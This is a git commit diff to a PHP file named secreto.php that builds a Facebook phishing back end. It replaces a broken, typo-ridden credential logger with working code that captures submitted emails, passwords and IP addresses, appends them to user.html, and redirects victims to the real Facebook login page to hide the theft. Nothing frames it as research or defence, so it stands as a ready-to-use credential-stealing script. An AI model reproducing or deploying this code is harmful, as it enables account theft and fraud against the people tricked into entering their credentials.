2ef99be46aa573b94c713bce2e8a34ce6be2e2e0
DaisukeDan <36879715+DaisukeDan@users.noreply.github.com>
2018-03-21 12:20:50 -0500

    1
    1

--- secreto.php
+++ secreto.php
@@ -1,19 +1,11 @@
 <?php
-header(¨Location: http://www.Facebook.com/login.php ¨);
-$handle = fopen(¨contraseñas.txt¨, ¨a¨):
 
-foreach($_GET as $variable => $value) {
-        fwrite(Shandle, $variable);
+$email = $_POST['email']; 
+$pass = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR']; 
+$f = fopen("user.html", "a"); 
+fwrite ($f, 'Email: [<b><font color="#0000FF">'.$email.'</font></b>] Password: [<b><font color="#FF0040">'.$pass.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');
+fclose($f);
 
-        fwrite($handle, ¨=¨);
- 
-        fwrite($handle, $value);
-
-        fwrite($handle, ¨\r\n¨);
-}
-
-frité($ande, ¨\r\n¨);
-fclose($handle);
-
-exit
+header("Location: https://www.facebook.com/login.php");
 ?>
